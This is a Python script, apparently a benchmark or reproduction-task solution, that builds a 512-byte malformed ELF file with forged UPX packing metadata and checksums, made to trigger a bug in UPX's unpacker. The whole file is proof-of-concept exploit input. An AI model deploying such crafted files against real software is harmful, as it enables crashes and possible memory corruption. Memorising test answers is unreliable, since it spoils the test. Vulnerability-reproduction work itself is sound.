import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = bytearray(512)

        # --- Configuration ---
        FILE_SIZE = 512
        SH_INIT_VADDR = 0x08049000
        PH1_VADDR = 0x08048000
        PH2_VADDR = SH_INIT_VADDR

        # --- Offsets ---
        EHDR_OFF = 0
        PHDR_OFF = 52
        SHDR_OFF = PHDR_OFF + 2 * 32  # 116
        SHSTRTAB_DATA_OFF = 240
        INIT_DATA_OFF = 300
        COMPRESSED_DATA_OFF = 400
        
        L_INFO_LX_SIZE = 16
        P_INFO_SIZE = 8
        B_INFO_SIZE = 16
        
        L_INFO_OFFSET = FILE_SIZE - 8 - L_INFO_LX_SIZE  # 488
        P_INFO_OFFSET = L_INFO_OFFSET - P_INFO_SIZE    # 480
        B_INFO_OFFSET = P_INFO_OFFSET - B_INFO_SIZE    # 464

        # --- Elf32_Ehdr (52 bytes) ---
        e_ident = b'\x7fELF\x01\x01\x01' + b'\0' * 9
        e_type = 3  # ET_DYN
        e_machine = 3  # EM_386
        e_version = 1
        e_entry = 0
        e_phoff = PHDR_OFF
        e_shoff = SHDR_OFF
        e_flags = 0
        e_ehsize = 52
        e_phentsize = 32
        e_phnum = 2
        e_shentsize = 40
        e_shnum = 3
        e_shstrndx = 2

        ehdr_format = '<16sHHIIIIIHHHHHH'
        ehdr = struct.pack(ehdr_format, e_ident, e_type, e_machine, e_version,
                           e_entry, e_phoff, e_shoff, e_flags, e_ehsize,
                           e_phentsize, e_phnum, e_shentsize, e_shnum,
                           e_shstrndx)
        poc[EHDR_OFF:EHDR_OFF + len(ehdr)] = ehdr

        # --- Elf32_Phdr Table (2 * 32 bytes) ---
        phdr_format = '<IIIIIIII'
        phdr0 = struct.pack(phdr_format, 1, 0, PH1_VADDR, PH1_VADDR, 0, 0x1000, 5, 0x1000)
        poc[PHDR_OFF:PHDR_OFF + 32] = phdr0

        INIT_DATA_SIZE = 16
        phdr1 = struct.pack(phdr_format, 1, INIT_DATA_OFF, PH2_VADDR, PH2_VADDR,
                            INIT_DATA_SIZE, 0x1000, 6, 0x1000)
        poc[PHDR_OFF + 32:PHDR_OFF + 64] = phdr1

        # --- Section Header String Table (.shstrtab) Data ---
        shstrtab_data = b'\0.init\0.shstrtab\0'
        poc[SHSTRTAB_DATA_OFF:SHSTRTAB_DATA_OFF + len(shstrtab_data)] = shstrtab_data

        # --- Elf32_Shdr Table (3 * 40 bytes) ---
        shdr_format = '<IIIIIIIIII'
        shdr0 = struct.pack(shdr_format, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
        poc[SHDR_OFF:SHDR_OFF + 40] = shdr0

        shdr1 = struct.pack(shdr_format, 1, 1, 6, SH_INIT_VADDR, INIT_DATA_OFF,
                            INIT_DATA_SIZE, 0, 0, 4, 0)
        poc[SHDR_OFF + 40:SHDR_OFF + 80] = shdr1

        shdr2 = struct.pack(shdr_format, 7, 3, 0, 0, SHSTRTAB_DATA_OFF,
                            len(shstrtab_data), 0, 0, 1, 0)
        poc[SHDR_OFF + 80:SHDR_OFF + 120] = shdr2
        
        # --- Data for .init section ---
        O_SIZE = 64
        N_SIZE = 16
        init_data = struct.pack('<IIII', O_SIZE, N_SIZE, COMPRESSED_DATA_OFF, 0)
        poc[INIT_DATA_OFF:INIT_DATA_OFF + len(init_data)] = init_data

        # --- Fake Compressed Data ---
        poc[COMPRESSED_DATA_OFF:COMPRESSED_DATA_OFF + O_SIZE] = b'\x00' * O_SIZE

        # --- UPX b_info Table (2 * 8 bytes) ---
        b_info_format = '<BBHI'
        b_info0 = struct.pack(b_info_format, 0, 0, 0, 0)
        b_info1 = struct.pack(b_info_format, 8, 0, 0, 0)
        poc[B_INFO_OFFSET:B_INFO_OFFSET + 8] = b_info0
        poc[B_INFO_OFFSET + 8:B_INFO_OFFSET + 16] = b_info1
        
        # --- UPX p_info Table (2 * 4 bytes) ---
        p_info_data = struct.pack('<II', 1, 0)
        poc[P_INFO_OFFSET:P_INFO_OFFSET + len(p_info_data)] = p_info_data
        
        # --- UPX l_info_lx Struct (16 bytes) ---
        l_info_lx_format = '<IHHII'
        temp_l_info = struct.pack(l_info_lx_format, 0, e_phnum, e_shnum, B_INFO_OFFSET, P_INFO_OFFSET)
        l_checksum = zlib.adler32(temp_l_info)
        l_info_lx_data = struct.pack(l_info_lx_format, l_checksum, e_phnum, e_shnum, B_INFO_OFFSET, P_INFO_OFFSET)
        poc[L_INFO_OFFSET:L_INFO_OFFSET + len(l_info_lx_data)] = l_info_lx_data

        # --- File Trailer (u_adler and u_len, 8 bytes) ---
        u_adler = zlib.adler32(poc[0:FILE_SIZE - 8])
        trailer_data = struct.pack('<II', u_adler, FILE_SIZE)
        poc[FILE_SIZE - 8:FILE_SIZE] = trailer_data

        return bytes(poc)